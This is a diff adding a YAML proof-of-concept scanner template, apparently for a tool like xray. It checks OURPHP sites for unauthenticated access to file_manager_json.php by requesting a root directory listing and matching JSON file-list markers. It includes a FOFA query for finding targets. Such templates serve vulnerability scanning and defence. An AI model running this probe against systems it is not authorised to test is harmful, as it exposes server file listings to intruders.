@@ -1,0 +1,15 @@
+id: poc-yaml-ourphp-file-manager-json-unauthorized-access
+info:
+  name: OURPHP file_manager_json 未授权访问漏洞
+  severity: medium
+  tags:
+  - 未授权访问
+  finger: ourphp
+  fofa: body="OURPHP"
+requests:
+- method: GET
+  path: /function/editor/php/file_manager_json.php?path=/&order=NAME&dir=file
+  expression: status_code == 200 && contains(body,"\"file_list\":") && contains(body,"\"is_dir\":true")
+    && contains(body,"\"filename\":") && !contains(body,"<") && contains(content_type,"application/json")
+variables: {}
+transport: http
